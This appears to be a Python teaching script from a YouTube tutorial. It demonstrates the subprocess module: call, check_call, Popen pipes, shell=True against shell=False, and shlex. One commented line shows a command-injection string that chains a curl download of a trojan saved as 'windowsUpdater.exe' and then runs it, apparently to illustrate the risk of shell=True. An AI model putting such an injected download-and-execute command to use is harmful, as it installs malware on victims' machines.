"""
Snippet used on my Youtube tutorial on Subprocess module
All demos are also available in separate files for better readability and focus
"""
import subprocess
import shlex

# this module is the replacement for os.system, os.spawn, os.popen, os.popen2, etc
exit_code = subprocess.call("whoami")  # execute and wait to finish
print(exit_code)
r = subprocess.call("ls")
subprocess.call(['ls', '-al'])
try:
    # if the ran commands exits with a status code other than 0, then exception is throw
    result = subprocess.check_call("dir")
    print("dir_result %d" % result)

    # python -c "print('I am cool')"
    py_result = subprocess.check_call(["python", "-c", "print('I am cool')"])
    print("python result %d" % py_result)

    # python -c 'invalid syntax, why not?'
    py_result = subprocess.check_call(["python", "-c", "invalid syntax, why not?"])
    print("python result %d" % py_result)
except subprocess.CalledProcessError as e:
    print("exception thrown " + str(e))

# localhost && curl https://somedomain.com/trojan.exe -o windowsUpdater.exe && windowsUpdater.exe


subprocess.call("echo 2 && echo 3", shell=False)
subprocess.call("echo 2 && echo 3", shell=True)
subprocess.call("cat ../db/sqlite.py | grep -in insert", shell=True)

with subprocess.Popen("python", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as proc:
    stdout, stderr = proc.communicate("print(2)\nprint('Hello sent from script as input')".encode())
    print("Out " + stdout.decode())
    print("Error " + stderr.decode())
    # pexpect for multiple inputs

shlex_args = shlex.split("python -c \"print('Shlex roks')\"")
print(shlex_args)
# subprocess.call(shlex_args)

cat_process = subprocess.Popen(["cat", "../db/sqlite.py"], stdout=subprocess.PIPE)
grep_process = subprocess.Popen(["grep", "-in", "insert"], stdin=cat_process.stdout, stdout=subprocess.PIPE)
output = grep_process.communicate()[0]
cat_process.stdout.close()
print(output.decode())
